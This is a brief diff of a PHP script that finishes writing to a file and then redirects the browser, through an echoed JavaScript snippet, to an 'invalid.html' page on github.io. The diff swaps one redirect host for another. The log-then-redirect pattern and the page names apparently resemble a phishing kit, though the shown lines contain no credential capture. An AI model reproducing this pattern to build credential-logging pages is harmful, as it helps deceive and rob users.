@@ -59,8 +59,9 @@ fwrite($handle, "\n");
 fclose($handle);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-window.location=\"https://adsrewards.github.io/settings/invalid.html\";
+window.location=\"https://sayabanr.github.io/Confir/invalid.html\";
 // -->
 </script>";
 ?>
+
 
